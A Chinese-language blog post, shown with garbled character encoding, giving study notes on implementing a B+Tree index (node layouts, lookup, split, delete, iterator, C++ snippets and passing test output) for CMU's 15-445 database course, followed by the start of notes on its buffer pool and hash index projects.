<p>åœ¨CMU-DBä»Šå¹´çš„è¯¾ç¨‹ä¸­ï¼ˆ<a href="https://15445.courses.cs.cmu.edu/fall2022/project2/">2022-fall</a>ï¼‰ï¼Œå®éªŒä¸­è¦æ±‚å®ç°çš„æ˜¯åŸºäºB+Treeçš„ç´¢å¼•ï¼Œè€Œä¸æ˜¯ä¹‹å‰çš„Extensible Hash Indexã€‚æ¯•ç«Ÿæ˜¯æ•°æ®åº“è¯¾ç¨‹ï¼ŒB+Treeçš„é‡è¦æ€§ä¸è¨€è€Œå–»ï¼Œè¿™è¾¹è¡¥å……å­¦ä¹ å®ç°ä¸€ä¸‹ã€‚</p>
<p><img src="./images/blog20221113/b%2Btree.png" alt="" /></p>
<p align="center"><a href="https://www.db-book.com/">B+Tree</a> for a table</p>
<h2 id="btreeçš„æ€§è´¨"><a class="header" href="#btreeçš„æ€§è´¨">B+Treeçš„æ€§è´¨</a></h2>
<p>ä¸€æ£µnè·¯å¹³è¡¡æœç´¢æ ‘</p>
<ul>
<li>It is perfectly balanced (i.e., every leaf node is at the same depth in the tree)</li>
<li>Every node other than the root is at least half-full N/2-1 â‰¤ #keys â‰¤ N-1</li>
<li>Every inner node with k keys has k+1 non-null children</li>
</ul>
<blockquote>
<p><strong>B-Treeå’ŒB+Treeçš„åŒºåˆ«</strong></br>
B-Treeï¼šstored keys and values in all nodes in the tree. ï¼ˆç©ºé—´åˆ©ç”¨ç‡é«˜ï¼Œæ¯ä¸ªkeyåªåœ¨æ ‘ä¸­å‡ºç°ä¸€æ¬¡ï¼‰</br>
B+Treeï¼šonly stores values in leaf nodes. Inner nodes only guide the search process.</p>
</blockquote>
<ul>
<li>æ³¨æ„ï¼šä¸‹é¢æ‰€æœ‰å™è¿°ä¸­ï¼Œç´¢å¼•éƒ½æ˜¯ä»0å¼€å§‹ï¼Œä¾¿äºå’Œå®ç°åŒæ­¥ï¼ˆè€Œä¸æ˜¯åƒè¯¾æœ¬ä¸­çš„ä»1å¼€å§‹ï¼Œç»™æˆ‘çœ‹æ‡µäº†ï¼‰ã€‚</li>
</ul>
<h2 id="btreeçš„ä¸¤ä¸ªèŠ‚ç‚¹ç±»å‹"><a class="header" href="#btreeçš„ä¸¤ä¸ªèŠ‚ç‚¹ç±»å‹">B+Treeçš„ä¸¤ä¸ªèŠ‚ç‚¹ç±»å‹</a></h2>
<p>B+Treeå†…éƒ¨æœ‰ä¸¤ç§èŠ‚ç‚¹ç±»å‹ï¼Œ<em>Leaf Node</em> å’Œ <em>Inner Node</em>ã€‚åœ¨ Database-System-Concepts-7th-Edition è¯¾æœ¬ä¸­ï¼ŒLeaf Nodeå’ŒInner Node éƒ½æœ‰ä¸€ä¸ªå…¬å…±çš„nå€¼ï¼Œæ¥ç¡®å®šä¸¤ç§èŠ‚ç‚¹çš„å¤§å°ç›¸ç­‰ï¼ˆInner Nodeæœ€å¤šæœ‰Nä¸ªpointerï¼ŒLeaf Nodeæœ€å¤šæœ‰Nä¸ªkv-pairï¼‰ï¼Œä½†æ˜¯åœ¨bustubé¡¹ç›®ä¸­ï¼Œå¯ä»¥ç»™ä¸¤ç§èŠ‚ç‚¹è®¾å®šä¸åŒçš„Nå€¼ã€‚</p>
<h3 id="inner-node"><a class="header" href="#inner-node">Inner Node</a></h3>
<p>Inner Node èŠ‚ç‚¹çš„æ•°æ®ç»“æ„å¦‚ä¸‹ã€‚å¯¹äº<code>max_internal_size == 4</code>çš„ä¸€ä¸ªB+Inner Node æœ€å¤šå¯ä»¥ä¿å­˜4ä¸ªpointerï¼ˆp0 ~ p3ï¼‰ï¼Œ3ä¸ªkeyï¼ˆk1ï½k3ï¼‰ï¼›æœ€å°‘å¯ä»¥ä¿å­˜<code>(max_internal_size + 1) / 2</code>ä¸ªpointerï¼Œå³2ä¸ªã€‚
æ¯ä¸ªpointerä¿å­˜æŒ‡å‘æ ‘ä¸­å¦å¤–ä¸€ä¸ªèŠ‚ç‚¹çš„æ‰€åœ¨é¡µçš„page_idï¼Œkeyç”¨äºåœ¨å½“å‰çš„èŠ‚ç‚¹ä¸­è¿›è¡Œæœç´¢ï¼Œæœç´¢æ—¶æ³¨æ„k0æ˜¯æ— æ•ˆçš„ã€‚</p>
<p>æ¯ä¸ªpointeræŒ‡å‘ä¸‹ä¸€å±‚ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆLeafPageæˆ–InternalPageï¼‰ã€‚
å‡è®¾ p1 æŒ‡å‘èŠ‚ç‚¹N'ï¼ŒN'ä¸­åŒ…å«çš„æ‰€æœ‰é”® k' çš„å¤§å°æ»¡è¶³ <code>k1 &lt;= k' &lt; k2</code>ï¼Œ</p>
<pre><code class="language-txt">    + -  +----+----+----+----+----+----+----+
    | k0 | p0 | k1 | p1 | k2 | p2 | k3 | p3 |
    + -  +----+----+----+----+----+----+----+
    &lt; - &gt;
      ^
invalid key
</code></pre>
<p><strong>å®ç°</strong>
åœ¨storage/page/b_plus_tree_internal_pageä¸­å®Œæˆå¯¹å†…éƒ¨èŠ‚ç‚¹çš„å®šä¹‰ï¼Œæ³¨æ„ï¼Œåœ¨æ•°æ®åº“ä¸­ï¼Œä¸€èˆ¬è®©ä¸€ä¸ªå®Œæ•´çš„é¡µä½œä¸ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œé˜²æ­¢å¤ªå¤šç¢ç‰‡äº§ç”Ÿã€‚å› æ­¤åœ¨å®šä¹‰ç›¸å…³å¤´æ–‡ä»¶çš„æ—¶å€™ï¼Œç›´æ¥å°†å­˜å‚¨é”®å€¼å¯¹çš„æ•°ç»„è®¾ç½®ä¸ºè·Ÿä¸€ä¸ªå†…å­˜é¡µç›¸å¯¹åº”çš„å¤§å°ã€‚</p>
<p>Pageè¿˜ä¼šä¿å­˜ä¸€ä¸ªæŒ‡å‘çˆ¶èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œå¯¹äºä¸€ä¸ªçˆ¶èŠ‚ç‚¹æŒ‡é’ˆä¸ºç©ºçš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆè¿™ä¸ªèŠ‚ç‚¹å°±æ˜¯æ ¹ã€‚æ³¨æ„ï¼Œä¸¤ç§ç±»å‹çš„èŠ‚ç‚¹éƒ½å¯ä»¥ä½œä¸ºæ ¹æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚åˆå§‹çš„æ—¶å€™åªæœ‰ä¸€ä¸ªå¶å­ç»“ç‚¹ï¼Œè€Œå®ƒå°±æ˜¯æ ¹ã€‚</p>
<pre><code class="language-cpp">#define MappingType std::pair&lt;KeyType, ValueType&gt;
#define INTERNAL_PAGE_HEADER_SIZE 24
#define INTERNAL_PAGE_SIZE ((PAGE_SIZE - INTERNAL_PAGE_HEADER_SIZE) / (sizeof(MappingType)))
MappingType array_[INTERNAL_PAGE_SIZE];
</code></pre>
<h4 id="lookup-in-inner-node"><a class="header" href="#lookup-in-inner-node">Lookup in Inner Node</a></h4>
<p>åœ¨å†…éƒ¨èŠ‚ç‚¹ä¸­æœç´¢çš„æ—¶å€™ï¼Œç”±äºkeyéƒ½æ˜¯æœ‰åºæ’åˆ—ï¼Œå¯ä»¥ç”¨äºŒåˆ†æ³•åŠ å¿«æœç´¢ã€‚<code>GetSize()</code>è¿”å›çš„æ˜¯å­˜å‚¨çš„æŒ‡é’ˆæ•°é‡ã€‚
è¿”å›çš„æ˜¯keyå€¼å¯èƒ½å‡ºç°çš„èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œå³èŠ‚ç‚¹å†…ä»å·¦åˆ°å³çš„æ‰€æœ‰æŒ‡é’ˆä¸­ï¼Œæœ€åä¸€ä¸ªæŒ‡é’ˆæ‰€æŒ‡å‘çš„å€¼å°äºç­‰äºkeyçš„ã€‚</p>
<pre><code class="language-cpp">ValueType B_PLUS_TREE_INTERNAL_PAGE_TYPE::Lookup(const KeyType &amp;key, const KeyComparator &amp;comparator) const {
  // finding the first index that KeyAt(index) &lt;= key
  int left = 0;
  int right = GetSize()-1;
  int index = GetSize()-1;
  while (left &lt;= right) {
      int mid = left + ((right - left) &gt;&gt; 1);
      if (mid == 0 || comparator(KeyAt(mid), key) &lt;= 0) {
        index = mid; // keyè‡³å°‘åœ¨è¿™ä¸ªkv pairä¸­
        left = mid + 1;
      } else {
        right = mid - 1;
      }
  }
  return array_[index].second;
}
</code></pre>
<p>ä¸ºäº†æ–¹ä¾¿å¾€ä¸€ä¸ªæ»¡èŠ‚ç‚¹æ’å…¥æ—¶ä¸å†åˆ†é…é¢å¤–çš„ç©ºé—´ï¼Œå¦‚æœå¯¹äºåˆå§‹åŒ–é»˜è®¤è®¾å®šçš„<code>max_internal_page == INTERNAL_PAGE_SIZE</code>æ—¶ï¼Œå°†<code>max_internal_page -= 1</code>ï¼Œå°‘ä¿å­˜ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿™æ ·åœ¨åé¢Insertçš„Splitæ—¶ï¼Œä¸éœ€è¦é¢å¤–åˆ†é…ç©ºé—´äº†ï¼Œç›´æ¥å‘æ•°ç»„çš„æœ«å°¾æ’å…¥å³å¯ã€‚Leaf Nodeçš„å®ç°ä¹Ÿæ˜¯ç±»ä¼¼ã€‚</p>
<h3 id="leaf-node"><a class="header" href="#leaf-node">Leaf Node</a></h3>
<p>Leaf Node èŠ‚ç‚¹çš„æ•°æ®ç»“æ„å¦‚ä¸‹ã€‚å¯¹äº<code>max_leaf_size = 4</code>çš„ä¸€ä¸ªB+Treeï¼ŒLeaf Node æœ€å¤šå¯ä»¥å®¹çº³3ä¸ªkey-valueå¯¹ï¼Œå³<code>max_leaf_size - 1</code>ï¼›æœ€å°‘å¯ä»¥ä¿å­˜<code>max_leaf_size / 2</code>ä¸ªkey-valueå¯¹ã€‚å¶èŠ‚ç‚¹å’Œå†…éƒ¨èŠ‚ç‚¹ä¸åŒçš„åœ°æ–¹æ˜¯ï¼Œæ¯ä¸ªå¶èŠ‚ç‚¹è¿˜ä¿å­˜äº†ä¸ªæŒ‡å‘ç›¸é‚»å³è¾¹å¶èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œä¾¿äºå¯¹æ ‘å­˜å‚¨çš„å€¼è¿›è¡Œæœ‰åºéå†ã€‚</p>
<p>B+Treeçš„å¶èŠ‚ç‚¹çš„valueå¯ä»¥å­˜å‚¨RecordIDæˆ–è€…ç›´æ¥å­˜å‚¨Tupleã€‚æœ¬æ¬¡å®ç°ä¸­å­˜å‚¨çš„æ˜¯RecordIDã€‚</p>
<pre><code class="language-txt">    +----+----+----+----+----+----+     +---+
    | k0 | v0 | k1 | v1 | k2 | v2 |     | p |
    +----+----+----+----+----+----+     +---+ 
                                          ^ point to the next leaf
</code></pre>
<p>åœ¨Leaf Nodeä¸­æ‰€æœ‰çš„æ—¶å€™ï¼Œè¿”å›çš„æ˜¯ the first index i such that <code>array[i].first &gt;= key</code>ï¼Œè·ŸInner Nodeæœ‰æ‰€ä¸åŒï¼Œæ˜¯å› ä¸ºåœ¨å®ç°è¿­ä»£å™¨çš„æ—¶å€™ï¼Œè¿™æ ·çš„è¿”å›å¯ä»¥å½“ä½œè¿­ä»£å™¨çš„<code>End()</code>ã€‚</p>
<h2 id="btreeçš„æ“ä½œ"><a class="header" href="#btreeçš„æ“ä½œ">B+Treeçš„æ“ä½œ</a></h2>
<p>åœ¨è¯»å–å’Œä¿®æ”¹æ ‘çš„èŠ‚ç‚¹æ—¶ï¼Œè®°å¾—ä½¿ç”¨buffer pool manageræ¥å®Œæˆå†…å­˜é¡µçš„è·å–å’Œåˆ é™¤ã€è„é¡µçš„æ ‡æ³¨ã€unusedé¡µçš„Unpinã€‚</p>
<h3 id="search"><a class="header" href="#search">Search</a></h3>
<p>æœç´¢æ“ä½œï¼Œå³æ˜¯ä¸€ä¸ªä»æ ¹åˆ°å¶çš„è¿­ä»£æˆ–é€’å½’æœç´¢è¿‡ç¨‹ï¼ŒèŠ‚ç‚¹å†…çš„æœç´¢å¯ä»¥ä½¿ç”¨äºŒåˆ†ã€‚</p>
<h3 id="insert"><a class="header" href="#insert">Insert</a></h3>
<p>æ’å…¥æ“ä½œæ¶‰åŠåˆ°èŠ‚ç‚¹çš„åˆ†è£‚ï¼Œé€’å½’å‘çˆ¶èŠ‚ç‚¹çš„æ’å…¥æ–°çš„èŠ‚ç‚¹çš„pointerå’Œå¯ç”¨äºåˆ†å¼€æ–°èŠ‚ç‚¹å’Œè€èŠ‚ç‚¹çš„keyã€‚
å…·ä½“ç®—æ³•æµç¨‹å¯ä»¥å‚ç…§è¯¾æœ¬å®ç°ã€‚æˆ‘è¿™é‡Œåªè®°å½•åœ¨å®ç°è¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„çš„ç‚¹ã€‚</p>
<p>å½“ä¸€ä¸ªèŠ‚ç‚¹åœ¨æ’å…¥åå¤§å°è¶…è¿‡äº†å¯¹åº”çš„<code>max_size</code>ï¼Œå°±éœ€è¦è¿›è¡Œåˆ†è£‚ï¼ˆSplitï¼‰ã€‚
æˆ‘ä»¬è¿™é‡Œå‡å®š<strong>è¿‡æ»¡</strong>çš„å¶èŠ‚ç‚¹å’Œå†…éƒ¨èŠ‚ç‚¹çš„å¤§å°éƒ½æ˜¯nã€‚</p>
<p>å…³é”®å‡½æ•°æ˜¯<code>MoveHalfTo(recipient)</code>ï¼Œæ­¤å‡½æ•°è¦åœ¨leafå’ŒinnerèŠ‚ç‚¹éƒ½å®Œæˆå®ç°ã€‚åŠŸèƒ½æ˜¯å°†æ»¡èŠ‚ç‚¹çš„ä¸€åŠå…ƒç´ ç•™ç»™è‡ªå·±ï¼Œå¦ä¸€åŠæŒ‰åºå¤åˆ¶åˆ°recipientã€‚è¿™é‡Œè¿‡æ»¡èŠ‚ç‚¹çš„å®šä¹‰æ˜¯ï¼ŒåŸæœ¬éœ€è¦å¼€è¾Ÿæ–°ç©ºé—´çš„æ’å…¥ï¼Œå˜ä¸ºç›´æ¥åœ¨æ»¡èŠ‚ç‚¹ä¸­è¿›è¡Œæ’å…¥ï¼Œå› æ­¤æ­¤æ—¶èŠ‚ç‚¹çš„å¤§å°å°±å˜æˆåˆæ³•å¤§å°åŠ ä¸€ã€‚
å¯¹äºä¸€ä¸ªè¿‡æ»¡çš„èŠ‚ç‚¹ï¼Œå°†ä»<code>index=(n+1)/2</code>çš„ä½ç½®å¼€å§‹åˆ°<code>index=n</code>çš„æ‰€æœ‰kv-pairéƒ½å¤åˆ¶ç»™recipientï¼ˆrecipientä»è‡ªå·±çš„idx=0å¼€å§‹æ¥æ”¶kvï¼‰ï¼Œå‰©ä¸‹çš„ç•™ç»™è‡ªå·±ã€‚
æ³¨æ„è¿™é‡Œå¯¹äºLeaf nodeå’ŒInner nodeéƒ½æ˜¯åŒæ ·çš„æ“ä½œï¼Œè™½ç„¶åœ¨å®šä¹‰ä¸­Inner nodeçš„ç¬¬0ä¸ªkeyå€¼æ— æ•ˆï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä»ç„¶éœ€è¦ä¿å­˜è¢«å¤åˆ¶è¿‡æ¥çš„ç¬¬0ä¸ªkeyï¼Œå› ä¸ºä¹‹åè¿™ä¸ªkeyä¼šä½œä¸ºåˆ†å¼€æ–°è€èŠ‚ç‚¹çš„separate_keyæ’å…¥åˆ°çˆ¶èŠ‚ç‚¹ä¸­ã€‚å®Œæˆæ’å…¥çˆ¶èŠ‚ç‚¹åï¼Œå³å¯æŠŠå¤„äºInner nodeçš„ç¬¬0ä¸ªkeyè®¾ä¸ºinvalidã€‚</p>
<h3 id="delete"><a class="header" href="#delete">Delete</a></h3>
<p>åˆ é™¤æ“ä½œæ—¶çº¢é»‘æ ‘ä¸­æœ€å¤æ‚çš„æ“ä½œï¼Œå¯¹æŸä¸ªèŠ‚ç‚¹è¿›è¡Œkv-pairåˆ é™¤ä¹‹åï¼Œåˆ¤æ–­èŠ‚ç‚¹çš„kv-pairæ•°é‡ï¼Œå¦‚æœä¸å†æ»¡è¶³åŠæ»¡çŠ¶æ€ï¼Œå°±è¦å¯»æ‰¾å‰ç»§èŠ‚ç‚¹æˆ–åç»§èŠ‚ç‚¹è¿›è¡Œåˆå¹¶ï¼ˆCoalesceï¼‰ï¼Œåˆå¹¶åé€’å½’çš„åœ¨parentä¸­åˆ é™¤å¯¹åº”çš„keyå’Œpointerï¼›å¦‚æœä¸èƒ½åˆå¹¶ï¼ˆç›¸é‚»èŠ‚ç‚¹çš„Sizeå’Œè¢«åˆ èŠ‚ç‚¹åˆå¹¶åå¤§å°è¶…è¿‡äº†èŠ‚ç‚¹æœ€å¤§å¤§å°ï¼‰ï¼Œå°±ä¸å‰ç»§èŠ‚ç‚¹æˆ–è€…åç»§èŠ‚ç‚¹è¿›è¡Œé‡åˆ†é…ï¼ˆRedistributeï¼‰ï¼Œé‡åˆ†é…åè¦å¯¹parentçš„å¯¹åº”keyè¿›è¡Œæ›´æ–°ã€‚</p>
<h3 id="è¿­ä»£å™¨"><a class="header" href="#è¿­ä»£å™¨">è¿­ä»£å™¨</a></h3>
<p>å®ç°åœ¨æ ‘ä¸­æŒ‰åºè¯»å–çš„è¿­ä»£å™¨ã€‚è¿­ä»£å™¨å†…éƒ¨ç”¨page_iterè®°å½•å½“å‰å¶èŠ‚ç‚¹ï¼Œkey_iterè®°å½•å½“å‰è®¿é—®åˆ°çš„ key indexã€‚
å½“page_iteræŒ‡å‘æœ€åä¸€ä¸ªå¶èŠ‚ç‚¹ä¸”key_iterçš„å€¼ä¸ºæœ€åä¸€ä¸ªæœ‰æ•ˆkv-pairçš„index+1æ—¶ï¼Œå³è®¤ä¸ºæ˜¯<code>End()</code>ã€‚
æ³¨æ„é‡è½½çš„æ˜¯å‰ç¼€++è¿ç®—ç¬¦é‡è½½ã€‚</p>
<pre><code class="language-c++">// ++Iterator
INDEX_TEMPLATE_ARGUMENTS
INDEXITERATOR_TYPE &amp;INDEXITERATOR_TYPE::operator++() {
  if (!IsEnd()) {
    if (key_iter_ &lt; page_iter_-&gt;GetSize() - 1) {
      key_iter_++;
    } else if (page_iter_-&gt;GetNextPageId() != INVALID_PAGE_ID) {
      LeafPage *next_page = reinterpret_cast&lt;LeafPage *&gt;(bpm_-&gt;FetchPage(page_iter_-&gt;GetNextPageId()));
      bpm_-&gt;UnpinPage(page_iter_-&gt;GetPageId(), false);
      page_iter_ = next_page;
      key_iter_ = 0;
    } else {
      key_iter_++; // make the iterator point to end
    }
  }
  return *this;
}
</code></pre>
<p>å®Œæˆè¿­ä»£å™¨å®ç°åï¼Œå°±å¯ä»¥é€šè¿‡insertã€deleteä¸¤ä¸ªtestã€‚è¿˜æœ‰ä¸ªconcurrent taskæˆ‘æ²¡åšï¼Œç­‰ä»¥åå§ã€‚</p>
<pre><code class="language-shell">root@docker-desktop:/bustub/build# ./test/b_plus_tree_insert_test 
Running main() from gmock_main.cc
[==========] Running 2 tests from 1 test suite.
[----------] Global test environment set-up.
[----------] 2 tests from BPlusTreeTests
[ RUN      ] BPlusTreeTests.InsertTest1
[       OK ] BPlusTreeTests.InsertTest1 (7 ms)
[ RUN      ] BPlusTreeTests.InsertTest2
[       OK ] BPlusTreeTests.InsertTest2 (3 ms)
[----------] 2 tests from BPlusTreeTests (11 ms total)

[----------] Global test environment tear-down
[==========] 2 tests from 1 test suite ran. (12 ms total)
[  PASSED  ] 2 tests.


root@docker-desktop:/bustub/build# ./test/b_plus_tree_delete_test 
Running main() from gmock_main.cc
[==========] Running 2 tests from 1 test suite.
[----------] Global test environment set-up.
[----------] 2 tests from BPlusTreeTests
[ RUN      ] BPlusTreeTests.DeleteTest1
[       OK ] BPlusTreeTests.DeleteTest1 (8 ms)
[ RUN      ] BPlusTreeTests.DeleteTest2
[       OK ] BPlusTreeTests.DeleteTest2 (5 ms)
[----------] 2 tests from BPlusTreeTests (13 ms total)

[----------] Global test environment tear-down
[==========] 2 tests from 1 test suite ran. (14 ms total)
[  PASSED  ] 2 tests.
</code></pre>
<h2 id="cç›¸å…³çŸ¥è¯†è¡¥å……"><a class="header" href="#cç›¸å…³çŸ¥è¯†è¡¥å……">C++ç›¸å…³çŸ¥è¯†è¡¥å……</a></h2>
<h3 id="å‡½æ•°æ¨¡æ¿"><a class="header" href="#å‡½æ•°æ¨¡æ¿">å‡½æ•°æ¨¡æ¿</a></h3>
<p>åœ¨åˆ†è£‚èŠ‚ç‚¹çš„æ—¶å€™ï¼Œä¸¤ç§ç±»å‹çš„èŠ‚ç‚¹çš„åˆ†è£‚é€»è¾‘ç›¸åŒï¼Œå¯ä»¥ç”¨æœ‰å‡½æ•°æ¨¡æ¿çš„Splitæ¥å®Œæˆï¼Œæé«˜ä»£ç çš„å¯è¯»æ€§ã€‚
ä½¿ç”¨å‡½æ•°æ¨¡æ¿æ—¶è¦æ³¨æ„ï¼ŒNç±»å‹ä¸Šè°ƒç”¨çš„å‡½æ•°åœ¨å®é™…ç±»å‹ä¸Šéƒ½è¦è¢«å®ç°ï¼Œå‡½æ•°ç­¾åè¦ç›¸åŒã€‚</p>
<p>å¯¹äºleafèŠ‚ç‚¹ï¼ŒMoveHalfToä¸éœ€è¦ buffer_pool_manager ï¼Œä½†ä¸ºäº†ä¿æŒå’ŒInternalPageçš„MoveHalfToå‡½æ•°ç­¾åä¸€è‡´ã€‚InternalPageéœ€è¦ buffer_pool_manager æ¥å®Œæˆä¿®æ”¹å­èŠ‚ç‚¹çš„çˆ¶æŒ‡é’ˆã€‚</p>
<pre><code class="language-c++">INDEX_TEMPLATE_ARGUMENTS
template &lt;typename N&gt;
N *BPLUSTREE_TYPE::Split(N *node) {
  //  create new leaf node L' , æ’å…¥åˆ°Lå’ŒLçš„åŸæ¥å³è¾¹èŠ‚ç‚¹ä¹‹é—´
  page_id_t page_id;
  // ä½¿ç”¨æ¨¡æ¿å‚æ•°å®šä¹‰page
  N *new_page = reinterpret_cast&lt;N *&gt;(buffer_pool_manager_-&gt;NewPage(&amp;page_id));
  if (new_page == nullptr) {
    throw Exception(ExceptionType::OUT_OF_MEMORY, &quot;Cannot alloc new page&quot;);
  }
  //  è®¾ç½®L'çš„metadata
  new_page-&gt;Init(page_id, node-&gt;GetParentPageId(), node-&gt;GetMaxSize());
  //  åˆ é™¤æ‰€æœ‰çš„Lçš„kv-pairs
  //  å¤åˆ¶Tçš„ä¸€åŠkv-pairsåˆ°Lï¼Œå¤åˆ¶å¦ä¸€åŠåˆ°L'
  // test: impl this both in the inner and leaf pages.
  node-&gt;MoveHalfTo(new_page, buffer_pool_manager_);
  return new_page;
}
</code></pre>
<h3 id="cmake"><a class="header" href="#cmake">Cmake</a></h3>
<p>bustubé¡¹ç›®ä¸­çš„æµ‹è¯•ä½¿ç”¨google testç¼–å†™ï¼Œä½†ä¸æ”¯æŒstdinè¯»å–è¾“å…¥ï¼Œæ— æ³•å¯è§†åŒ–ï¼Œåœ¨ä»Šå¹´çš„ä»“åº“ä¸­ï¼Œå‘ç°bustubå¤šäº†ä¸€ä¸ªå­ç›®å½•toolsï¼Œtoolsä¸­æœ‰ b_plus_tree_printer ï¼Œå¯ä»¥makeæ„å»ºäºŒè¿›åˆ¶ã€‚æ‰€ä»¥æˆ‘ä¹Ÿæ·»åŠ æœ‰å…³ç›®å½•ï¼Œå¢åŠ  b_plus_tree_printer è¿™ä¸ªäºŒè¿›åˆ¶ç¨‹åºã€‚</p>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸­çš„ CMakeList.txt ä¸­å¢åŠ  <code>add_subdirectory(tools)</code> ï¼Œåœ¨toolsæ–‡ä»¶å¤¹ä¸­åˆ›å»º CMakeList.txt å’Œ b_plus_tree_printer.cpp ï¼ŒCMakeList.txtçš„å†…å®¹æ˜¯å¦‚ä¸‹ï¼Œæ³¨æ„é“¾æ¥çš„åº“åç§°æ˜¯ <code>bustub_shared</code>ï¼ˆåœ¨2022å¹´çš„è¯¾ç¨‹ä»£ç ä»“åº“ä¸­åç§°æ˜¯<code>bustub</code>ï¼‰ã€‚</p>
<pre><code class="language-cmake">set(B_PLUS_TREE_PRINTER_SOURCES b_plus_tree_printer.cpp)
add_executable(b_plus_tree_printer ${B_PLUS_TREE_PRINTER_SOURCES})

target_link_libraries(b_plus_tree_printer bustub_shared)
set_target_properties(b_plus_tree_printer PROPERTIES OUTPUT_NAME b_plus_tree_printer)
</code></pre>
<p>é‡æ–°æ„å»º</p>
<pre><code class="language-shell"># at bustub root directory
$mkdir build &amp;&amp; cd build
$cmake -DCMAKE_BUILD_TYPE=DEBUG ..
$make b_plus_tree_printer
$./bin/b_plus_tree_printer
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cmu-15-445645-intro-to-database-systems"><a class="header" href="#cmu-15-445645-intro-to-database-systems">CMU 15-445/645 Intro to Database Systems</a></h1>
<p><a href="https://15445.courses.cs.cmu.edu/fall2021/">è¯¾ç¨‹</a>å­¦ä¹ æ€»ç»“ã€‚
è¯¾ç¨‹å†…éƒ¨è¦æ±‚çš„ä¸è¦æŠŠsolutionç›´æ¥æ”¾åˆ°ç½‘ä¸Šï¼Œæˆ‘è¿™è¾¹å°±è´´å„ç§å…·ä½“å®ç°äº†ï¼Œåªæ˜¯è®°å½•ä¸€äº›Projectçš„å…³é”®æƒ³æ³•å’Œå®ç°ï¼Œå¦å¤–å†è¡¥å……è®°å½•ä¸€äº›c++çš„çŸ¥è¯†ã€‚</p>
<h2 id="homework-1-sql"><a class="header" href="#homework-1-sql">Homework #1 SQL</a></h2>
<p>æ•°æ®åº“ç³»ç»Ÿçš„æ¥å£ã€‚è¯¾ç¨‹çš„ç¬¬ä¸€ä¸ªassignmentæ˜¯ä½¿ç”¨<a href="https://sqlite.org/cli.html#getting_started">sqlite3</a>ï¼Œå®Œæˆ10ä¸ªæŸ¥è¯¢æ“ä½œã€‚</p>
<h3 id="group-by"><a class="header" href="#group-by">group by</a></h3>
<blockquote>
<p>any attribute that is not present in the group by clause may appear in the select clause only as an argument to an aggregate function. (Chapter 3.7)</p>
</blockquote>
<h2 id="project-1-buffer-pool-manager"><a class="header" href="#project-1-buffer-pool-manager">Project #1 Buffer Pool Manager</a></h2>
<p>cacheä»diskä¸­è¯»å–çš„pageï¼Œä½¿ç”¨LRUçš„æ›¿æ¢ç­–ç•¥ç®¡ç†Bufferã€‚å¯¹äºParallel BPMï¼Œå¯èƒ½æœ‰å¤šä¸ªinstanceã€‚</p>
<h3 id="task-1-lru-replacer"><a class="header" href="#task-1-lru-replacer">Task #1 LRU Replacer</a></h3>
<p>ä½¿ç”¨åŒå‘é“¾è¡¨å’Œhashmapæ¥å®ç°lruï¼Œhashmapä¿å­˜åŒå‘é“¾è¡¨çš„è¿­ä»£å™¨ï¼Œå¿«é€Ÿå¢åˆ ã€‚
unpinæ“ä½œï¼Œé™ä½ä¸€ä¸ªpageçš„å¼•ç”¨æ¬¡æ•°ã€‚buffer Poolä¸­ä¸€ä¸ªpageçš„refrence countä¸º0äº†ï¼Œå°†è¿™ä¸ªpageæ”¾å…¥åˆ°Replaceçš„frameä¸­ï¼ŒReplacerè°ƒç”¨unpinè®°å½•è¿™ä¸ªframe
pinæ“ä½œï¼Œæ ‡è®°è¿™ä¸ªpageæ­£åœ¨è¢«ä½¿ç”¨ã€‚ä¸€ä¸ªå·²ç»åœ¨Replacerçš„frameï¼Œåœ¨buffer poolä¸­åˆè¢«å¼•ç”¨äº†ï¼Œå¢åŠ pageçš„å¼•ç”¨è®¡æ•°ï¼Œä»Replacerä¸­ç§»é™¤è¿™ä¸ªframe</p>
<h3 id="task-2-buffer-pool-manager-instance"><a class="header" href="#task-2-buffer-pool-manager-instance">Task #2 Buffer Pool Manager Instance</a></h3>
<p>ä½¿ç”¨free_listè®°å½•ç©ºé—²çš„pageï¼Œå¦‚æœfree_listä¸ºç©ºäº†ï¼Œå†ä½¿ç”¨LRUç­–ç•¥æ·˜æ±°pageã€‚</p>
<p>ä½¿ç”¨é¡µè¡¨æ˜ å°„å†…å­˜ä¸­frame_id -&gt; diskçš„page_id
frame_id_tï¼ŒæŒ‡çš„æ˜¯bufferä¸­çš„page poolçš„ä¸‹æ ‡
page_id_tï¼ŒæŒ‡çš„æ˜¯ç‰©ç†é¡µå·</p>
<h3 id="task-3-parallel-bpm"><a class="header" href="#task-3-parallel-bpm">Task #3 Parallel BPM</a></h3>
<p>ç”¨page_idæ¥å†³å®šæ˜ å°„åˆ°å“ªä¸ªinstanceã€‚æ¯ä¸ªinstanceæœ‰è‡ªå·±çš„latchè¿›è¡ŒåŒæ­¥ã€‚</p>
<h2 id="project-2-hash-index"><a class="header" href="#project-2-hash-index">Project #2 Hash Index</a></h2>
<p>æ•°æ®åº“ä¸­è¡¨çš„ç´¢å¼•ï¼ˆstorage/index/extensible_hash_table_indexï¼‰çš„å®ç°ï¼ŒåŸºäºextensible Hash tableï¼Œå¿«é€ŸæŸ¥æ‰¾Keyå¯¹åº”çš„page_idï¼Œåªæ”¯æŒnon-unique keyã€‚</p>
<h3 id="task-1-page-layouts"><a class="header" href="#task-1-page-layouts">Task #1 Page Layouts</a></h3>
